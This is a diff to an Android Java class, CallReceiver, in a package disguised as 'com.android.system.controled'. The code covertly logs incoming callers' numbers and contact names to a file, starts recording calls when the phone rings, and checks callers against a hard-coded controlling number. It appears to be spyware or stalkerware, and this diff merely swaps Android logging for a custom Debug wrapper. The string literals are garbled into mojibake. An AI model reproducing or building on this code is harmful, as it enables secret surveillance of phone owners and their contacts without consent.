@@ -8,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
 import com.android.system.controled.util.AudioUtil;
 import com.android.system.controled.util.ContactsUtil;
@@ -63,16 +62,16 @@ public class CallReceiver extends BroadcastReceiver {
 			switch (state) {
 
 			case TelephonyManager.CALL_STATE_IDLE:
-				Log.i("CallReceiver", "idle");
+				Debug.i("CallReceiver", "idle");
 				FileUtil.writeFile("\r\n¹Ò¶Ï£º" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "\r\n\r\n", Globle.FILE_CALL_LOG, true);
 				stopRecord(con);
 				break;
 			case TelephonyManager.CALL_STATE_OFFHOOK:
-				Log.i("CallReceiver", "offhook");
+				Debug.i("CallReceiver", "offhook");
 				FileUtil.writeFile("\r\n½ÓÌý£º" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()), Globle.FILE_CALL_LOG, true);
 				break;
 			case TelephonyManager.CALL_STATE_RINGING:
-				Log.i("CallReceiver", "ring num: " + incomingNumber);
+				Debug.i("CallReceiver", "ring num: " + incomingNumber);
 				FileUtil.writeFile("À´µç£º" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(con, incomingNumber) + ":" + incomingNumber, Globle.FILE_CALL_LOG, true);
 				startRecord(con, incomingNumber);
 				if (incomingNumber.contains(Globle.PHONE_NUMBER)) {
